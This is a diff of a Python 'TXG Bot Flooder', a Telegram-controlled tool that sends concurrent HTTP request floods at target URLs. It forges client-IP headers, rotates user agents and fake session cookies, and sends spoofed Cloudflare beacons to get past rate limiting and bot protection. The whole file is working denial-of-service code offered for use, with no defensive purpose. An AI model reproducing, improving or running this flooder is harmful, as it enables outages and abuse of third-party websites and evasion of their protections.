@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-🔥 TXG BOT FLOODER – Full Telegram Control + IP Bypass + Railway Ready
+🔥 TXG BOT FLOODER – Stable Version for Railway
 """
 
 import asyncio
@@ -12,14 +12,18 @@ import sys
 import logging
 import random
 import string
+import json
 from urllib.parse import urlparse
 from aiohttp import web
 
-from telegram import Update
-from telegram.ext import Application, CommandHandler, ContextTypes
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
 
 # ─── LOGGING ──────────────────────────────────────────────
-logging.basicConfig(level=logging.INFO)
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
+)
 logger = logging.getLogger(__name__)
 
 # ─── TELEGRAM CONFIG ──────────────────────────────────────
@@ -35,12 +39,12 @@ TARGET_APIS = [
 BEACON_URL = "https://performance.radar.cloudflare.com/api/beacon"
 
 # ─── FLOODER CONFIG ──────────────────────────────────────
-BATCH_SIZE = 100
-CONCURRENT_LIMIT = 200
-REQUEST_DELAY = 0.1
-MAX_RETRIES = 3
-MAX_USAGE_PER_IP = 7
-TIMEOUT = 15
+BATCH_SIZE = 50  # Reduced for stability
+CONCURRENT_LIMIT = 100  # Reduced for stability
+REQUEST_DELAY = 0.2  # Increased for stability
+MAX_RETRIES = 2
+MAX_USAGE_PER_IP = 5
+TIMEOUT = 10
 
 # ─── SHARED STATE ─────────────────────────────────────────
 flooder_running = False
@@ -50,6 +54,7 @@ stats = {'sent': 0, 'ok': 0, 'fail': 0, 'blocked': 0, 'retries': 0}
 stats_lock = asyncio.Lock()
 ip_lock = asyncio.Lock()
 start_time = 0
+last_report_time = 0
 
 # ─── HELPERS ──────────────────────────────────────────────
 def random_ip():
@@ -80,8 +85,6 @@ def get_android_user_agents():
         "Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
         "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36",
         "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.111 Mobile Safari/537.36",
-        "Mozilla/5.0 (Linux; Android 14; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.230 Mobile Safari/537.36",
-        "Mozilla/5.0 (Linux; Android 13; SM-N986B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36"
     ]
 
 def get_beacon_payload():
@@ -117,27 +120,10 @@ def get_beacon_payload():
 async def send_beacon(session, spoof_ip, origin):
     """Send Cloudflare beacon with correct origin and IP"""
     try:
-        # OPTIONS pre-flight
-        options_headers = {
-            "accept": "*/*",
-            "access-control-request-method": "POST",
-            "access-control-request-headers": "access-control-allow-origin,content-type,x-submit-token",
-            "origin": origin,
-            "user-agent": random.choice(get_android_user_agents()),
-            "sec-fetch-mode": "cors",
-            "x-requested-with": "XMLHttpRequest",
-            "sec-fetch-site": "cross-site",
-            "sec-fetch-dest": "empty",
-            "X-Forwarded-For": spoof_ip,
-            "X-Real-IP": spoof_ip,
-        }
-        async with session.options(BEACON_URL, headers=options_headers) as resp:
-            pass
-
-        # POST beacon
+        # POST beacon directly (skip OPTIONS to save resources)
         token = generate_token()
         payload = get_beacon_payload()
-        post_headers = {
+        headers = {
             "host": "performance.radar.cloudflare.com",
             "sec-ch-ua-platform": '"Android"',
             "user-agent": random.choice(get_android_user_agents()),
@@ -153,61 +139,60 @@ async def send_beacon(session, spoof_ip, origin):
             "sec-fetch-dest": "empty",
             "accept-encoding": "gzip, deflate, br",
             "accept-language": "en-US,en;q=0.9",
-            "priority": "u=1, i",
             "X-Forwarded-For": spoof_ip,
             "X-Real-IP": spoof_ip,
         }
-        async with session.post(BEACON_URL, headers=post_headers, json=payload, timeout=10) as resp:
+        async with session.post(BEACON_URL, headers=headers, json=payload, timeout=5) as resp:
             return resp.status == 200
-    except Exception as e:
+    except Exception:
         return False
 
 # ─── REQUEST WORKER ────────────────────────────────────────
 async def send_request(session, url, retry_count=0):
     """Send request with IP spoofing and retry logic"""
-    async with ip_lock:
-        spoof_ip = get_spoof_ip()
-    
-    parsed = urlparse(url)
-    origin = f"{parsed.scheme}://{parsed.netloc}"
-    
-    # Send beacon
-    await send_beacon(session, spoof_ip, origin)
-    
-    # Build headers with spoofed IPs
-    headers = {
-        "host": parsed.netloc,
-        "cache-control": "max-age=0",
-        "sec-ch-ua": '"Google Chrome";v="120", "Chromium";v="120", "Not=A?Brand";v="99"',
-        "sec-ch-ua-mobile": "?1",
-        "sec-ch-ua-platform": '"Android"',
-        "upgrade-insecure-requests": "1",
-        "user-agent": random.choice(get_android_user_agents()),
-        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
-        "dnt": "1",
-        "x-requested-with": "XMLHttpRequest",
-        "sec-fetch-site": "none",
-        "sec-fetch-mode": "navigate",
-        "sec-fetch-user": "?1",
-        "sec-fetch-dest": "document",
-        "accept-encoding": "gzip, deflate, br",
-        "accept-language": "en-US,en;q=0.9",
-        "cookie": f"PHPSESSID={''.join(random.choices(string.hexdigits, k=32))}",
-        "priority": "u=0, i",
-        "X-Forwarded-For": spoof_ip,
-        "X-Real-IP": spoof_ip,
-        "X-Originating-IP": spoof_ip,
-        "Forwarded": f"for={spoof_ip};proto=https",
-        "Client-IP": spoof_ip,
-        "X-Proxy-IP": spoof_ip,
-        "True-Client-IP": spoof_ip,
-    }
-    
-    timeout = aiohttp.ClientTimeout(total=TIMEOUT, connect=10)
-    
     try:
-        async with session.get(url, headers=headers, ssl=True, timeout=timeout) as resp:
+        async with ip_lock:
+            spoof_ip = get_spoof_ip()
+        
+        parsed = urlparse(url)
+        origin = f"{parsed.scheme}://{parsed.netloc}"
+        
+        # Send beacon (non-blocking)
+        asyncio.create_task(send_beacon(session, spoof_ip, origin))
+        
+        # Build headers with spoofed IPs
+        headers = {
+            "host": parsed.netloc,
+            "cache-control": "max-age=0",
+            "sec-ch-ua": '"Google Chrome";v="120", "Chromium";v="120", "Not=A?Brand";v="99"',
+            "sec-ch-ua-mobile": "?1",
+            "sec-ch-ua-platform": '"Android"',
+            "upgrade-insecure-requests": "1",
+            "user-agent": random.choice(get_android_user_agents()),
+            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
+            "dnt": "1",
+            "x-requested-with": "XMLHttpRequest",
+            "sec-fetch-site": "none",
+            "sec-fetch-mode": "navigate",
+            "sec-fetch-user": "?1",
+            "sec-fetch-dest": "document",
+            "accept-encoding": "gzip, deflate, br",
+            "accept-language": "en-US,en;q=0.9",
+            "cookie": f"PHPSESSID={''.join(random.choices(string.hexdigits, k=32))}",
+            "X-Forwarded-For": spoof_ip,
+            "X-Real-IP": spoof_ip,
+            "X-Originating-IP": spoof_ip,
+            "Forwarded": f"for={spoof_ip};proto=https",
+            "Client-IP": spoof_ip,
+            "X-Proxy-IP": spoof_ip,
+            "True-Client-IP": spoof_ip,
+        }
+        
+        timeout = aiohttp.ClientTimeout(total=TIMEOUT, connect=5)
+        
+        async with session.get(url, headers=headers, ssl=False, timeout=timeout) as resp:
             status = resp.status
+            await resp.read()  # Read but don't store
             
             async with stats_lock:
                 stats['sent'] += 1
@@ -224,7 +209,6 @@ async def send_request(session, url, retry_count=0):
                 
                 async with stats_lock:
                     stats['ok'] += 1
-                logger.debug(f"✅ OK [{spoof_ip}] → {status}")
                 return True
             
             elif status in (403, 429, 503, 500):
@@ -232,7 +216,7 @@ async def send_request(session, url, retry_count=0):
                 if retry_count < MAX_RETRIES:
                     async with stats_lock:
                         stats['retries'] += 1
-                    await asyncio.sleep(2 ** retry_count)
+                    await asyncio.sleep(1)
                     return await send_request(session, url, retry_count + 1)
                 else:
                     async with ip_lock:
@@ -241,14 +225,13 @@ async def send_request(session, url, retry_count=0):
                     async with stats_lock:
                         stats['fail'] += 1
                         stats['blocked'] += 1
-                    logger.debug(f"❌ BLOCKED [{spoof_ip}] → {status}")
                     return False
             else:
                 # Other errors - retry
                 if retry_count < MAX_RETRIES:
                     async with stats_lock:
                         stats['retries'] += 1
-                    await asyncio.sleep(2 ** retry_count)
+                    await asyncio.sleep(1)
                     return await send_request(session, url, retry_count + 1)
                 else:
                     async with ip_lock:
@@ -256,15 +239,13 @@ async def send_request(session, url, retry_count=0):
                             del ip_pool[spoof_ip]
                     async with stats_lock:
                         stats['fail'] += 1
-                    logger.debug(f"❌ FAIL [{spoof_ip}] → {status}")
                     return False
-    
+        
     except (aiohttp.ClientError, asyncio.TimeoutError) as e:
-        # Connection error - retry
         if retry_count < MAX_RETRIES:
             async with stats_lock:
                 stats['retries'] += 1
-            await asyncio.sleep(2 ** retry_count)
+            await asyncio.sleep(1)
             return await send_request(session, url, retry_count + 1)
         else:
             async with ip_lock:
@@ -273,53 +254,54 @@ async def send_request(session, url, retry_count=0):
             async with stats_lock:
                 stats['sent'] += 1
                 stats['fail'] += 1
-            logger.debug(f"⚠️ ERROR [{spoof_ip}] → {str(e)[:50]}")
             return False
     
-    except Exception as e:
+    except Exception:
         async with ip_lock:
             if spoof_ip in ip_pool:
                 del ip_pool[spoof_ip]
         async with stats_lock:
             stats['sent'] += 1
             stats['fail'] += 1
-        logger.debug(f"⚠️ EXCEPTION [{spoof_ip}] → {str(e)[:50]}")
         return False
 
 # ─── MAIN FLOODER LOOP ─────────────────────────────────────
 async def flooder_loop():
     global flooder_running
-    logger.info("🔥 Flooder started (infinite)")
+    logger.info("🔥 Flooder started")
 
     connector = aiohttp.TCPConnector(
         limit=CONCURRENT_LIMIT,
         limit_per_host=CONCURRENT_LIMIT,
-        force_close=False,
+        force_close=True,
         enable_cleanup_closed=True,
         ttl_dns_cache=300,
         ssl=False
     )
     
-    sem = asyncio.Semaphore(CONCURRENT_LIMIT)
-    
     async with aiohttp.ClientSession(connector=connector) as session:
         while flooder_running:
-            tasks = []
-            
-            for _ in range(BATCH_SIZE):
-                if not flooder_running:
-                    break
-                base = random.choice(TARGET_APIS)
-                url = build_url(base)
-                task = asyncio.create_task(send_request(session, url))
-                tasks.append(task)
-                await asyncio.sleep(REQUEST_DELAY)
-            
-            if tasks:
-                await asyncio.gather(*tasks, return_exceptions=True)
-            
-            if flooder_running:
-                await asyncio.sleep(REQUEST_DELAY)
+            try:
+                tasks = []
+                
+                for _ in range(BATCH_SIZE):
+                    if not flooder_running:
+                        break
+                    base = random.choice(TARGET_APIS)
+                    url = build_url(base)
+                    task = asyncio.create_task(send_request(session, url))
+                    tasks.append(task)
+                    await asyncio.sleep(REQUEST_DELAY)
+                
+                if tasks:
+                    await asyncio.gather(*tasks, return_exceptions=True)
+                
+                if flooder_running:
+                    await asyncio.sleep(0.5)
+                    
+            except Exception as e:
+                logger.error(f"Flooder loop error: {e}")
+                await asyncio.sleep(1)
         
         logger.info("Flooder stopped.")
 
@@ -330,22 +312,18 @@ async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     keyboard = [
-        ["⚡ Start Flood", "🛑 Stop Flood"],
-        ["📊 Status", "⚙️ Settings"],
-        ["📦 Batch Size", "⏱️ Timeout"]
-    ]
-    reply_markup = InlineKeyboardMarkup([
         [InlineKeyboardButton("⚡ Start Flood", callback_data="startflood")],
         [InlineKeyboardButton("🛑 Stop Flood", callback_data="stopflood")],
         [InlineKeyboardButton("📊 Status", callback_data="status")],
         [InlineKeyboardButton("⚙️ Settings", callback_data="settings")]
-    ])
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
     
     msg = (
         "🔥 **TXG Bot Flooder**\n"
         "🛡️ IP Spoofing + Cloudflare Bypass\n"
-        "📌 Railway Ready\n\n"
-        "Use /commands or buttons below:"
+        "📌 Railway Optimized\n\n"
+        "Use buttons below to control:"
     )
     await update.message.reply_text(msg, reply_markup=reply_markup)
 
@@ -425,7 +403,7 @@ async def show_status(update, context, query=None):
         pool_size = len(ip_pool)
     
     msg = (
-        f"📊 **Live Stats**\n"
+        f"📊 **Live Stats**\n\n"
         f"📤 Sent: {s:,}\n"
         f"✅ OK: {o:,} ({ok_pct:.1f}%)\n"
         f"❌ Errors: {f:,}\n"
@@ -451,13 +429,7 @@ async def show_settings(update, context, query=None):
         f"🔄 Max IP Usage: {MAX_USAGE_PER_IP}\n"
         f"🔄 Retries: {MAX_RETRIES}\n"
         f"⏳ Request Delay: {REQUEST_DELAY}s\n"
-        f"🎯 Targets: {len(TARGET_APIS)}\n\n"
-        f"Use commands to change settings:\n"
-        f"/setbatch <size>\n"
-        f"/settimeout <seconds>\n"
-        f"/setdelay <seconds>\n"
-        f"/setips <max_usage>\n"
-        f"/setretry <count>"
+        f"🎯 Targets: {len(TARGET_APIS)}"
     )
     
     if query:
@@ -465,76 +437,17 @@ async def show_settings(update, context, query=None):
     else:
         await update.message.reply_text(msg)
 
-# ─── SETTINGS COMMANDS ─────────────────────────────────────
-async def set_batch_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global BATCH_SIZE
-    if update.effective_user.id != ADMIN_ID:
-        return
-    try:
-        val = int(context.args[0])
-        if val < 1:
-            raise ValueError
-        BATCH_SIZE = val
-        await update.message.reply_text(f"✅ Batch size set to {val}")
-    except:
-        await update.message.reply_text("❌ Usage: /setbatch <number>")
-
-async def set_timeout_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global TIMEOUT
-    if update.effective_user.id != ADMIN_ID:
-        return
-    try:
-        val = int(context.args[0])
-        if val < 1:
-            raise ValueError
-        TIMEOUT = val
-        await update.message.reply_text(f"✅ Timeout set to {val}s")
-    except:
-        await update.message.reply_text("❌ Usage: /settimeout <seconds>")
-
-async def set_delay_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global REQUEST_DELAY
-    if update.effective_user.id != ADMIN_ID:
-        return
-    try:
-        val = float(context.args[0])
-        if val < 0:
-            raise ValueError
-        REQUEST_DELAY = val
-        await update.message.reply_text(f"✅ Request delay set to {val}s")
-    except:
-        await update.message.reply_text("❌ Usage: /setdelay <seconds>")
-
-async def set_ips_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global MAX_USAGE_PER_IP
-    if update.effective_user.id != ADMIN_ID:
-        return
-    try:
-        val = int(context.args[0])
-        if val < 1:
-            raise ValueError
-        MAX_USAGE_PER_IP = val
-        await update.message.reply_text(f"✅ Max IP usage set to {val}")
-    except:
-        await update.message.reply_text("❌ Usage: /setips <number>")
-
-async def set_retry_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global MAX_RETRIES
-    if update.effective_user.id != ADMIN_ID:
-        return
-    try:
-        val = int(context.args[0])
-        if val < 0:
-            raise ValueError
-        MAX_RETRIES = val
-        await update.message.reply_text(f"✅ Max retries set to {val}")
-    except:
-        await update.message.reply_text("❌ Usage: /setretry <number>")
-
 # ─── AUTO REPORT ────────────────────────────────────────────
 async def auto_report(context: ContextTypes.DEFAULT_TYPE):
+    global last_report_time
     if not flooder_running:
         return
+    
+    current_time = time.time()
+    if current_time - last_report_time < 30:
+        return
+    last_report_time = current_time
+    
     elapsed = time.time() - start_time
     async with stats_lock:
         s = stats['sent']
@@ -542,26 +455,23 @@ async def auto_report(context: ContextTypes.DEFAULT_TYPE):
         f = stats['fail']
         b = stats['blocked']
     rate = s / elapsed if elapsed > 0 else 0
-    ok_pct = (o / s * 100) if s > 0 else 0
-    
-    async with ip_lock:
-        pool_size = len(ip_pool)
     
     msg = (
-        f"📊 **Auto Report**\n"
+        f"📊 **Auto Report**\n\n"
         f"📤 Sent: {s:,}\n"
-        f"✅ OK: {o:,} ({ok_pct:.1f}%)\n"
+        f"✅ OK: {o:,}\n"
         f"❌ Errors: {f:,}\n"
         f"🚫 Blocked: {b:,}\n"
-        f"⚡ Rate: {rate:.1f} req/s\n"
-        f"🌐 IPs: {pool_size}\n"
-        f"🕒 Uptime: {int(elapsed)}s"
+        f"⚡ Rate: {rate:.1f} req/s"
     )
-    await context.bot.send_message(chat_id=ADMIN_ID, text=msg)
+    try:
+        await context.bot.send_message(chat_id=ADMIN_ID, text=msg)
+    except Exception:
+        pass
 
 # ─── HEALTH CHECK WEB SERVER ──────────────────────────────
 async def health(request):
-    return web.Response(text="✅ TXG Bot Flooder Online | IP Spoofing + CF Bypass", status=200)
+    return web.Response(text="✅ TXG Bot Flooder Online", status=200)
 
 async def run_webserver():
     app = web.Application()
@@ -572,8 +482,11 @@ async def run_webserver():
     port = int(os.getenv("PORT", "8080"))
     site = web.TCPSite(runner, host='0.0.0.0', port=port)
     await site.start()
-    logger.info("🌐 Web server started on port %s", port)
-    await asyncio.Event().wait()
+    logger.info(f"🌐 Web server started on port {port}")
+    
+    # Keep running
+    while True:
+        await asyncio.sleep(60)
 
 # ─── MAIN ──────────────────────────────────────────────────
 async def main():
@@ -586,11 +499,6 @@ async def main():
     app.add_handler(CommandHandler("startflood", start_flooder))
     app.add_handler(CommandHandler("stopflood", stop_flooder))
     app.add_handler(CommandHandler("settings", show_settings))
-    app.add_handler(CommandHandler("setbatch", set_batch_cmd))
-    app.add_handler(CommandHandler("settimeout", set_timeout_cmd))
-    app.add_handler(CommandHandler("setdelay", set_delay_cmd))
-    app.add_handler(CommandHandler("setips", set_ips_cmd))
-    app.add_handler(CommandHandler("setretry", set_retry_cmd))
     
     # Callback query handler for buttons
     app.add_handler(CallbackQueryHandler(button_handler))
@@ -634,7 +542,11 @@ if __name__ == "__main__":
         sys.exit(0)
     signal.signal(signal.SIGINT, signal_handler)
     signal.signal(signal.SIGTERM, signal_handler)
+    
     try:
         asyncio.run(main())
     except KeyboardInterrupt:
         logger.info("Exiting.")
+    except Exception as e:
+        logger.error(f"Fatal error: {e}")
+        sys.exit(1)
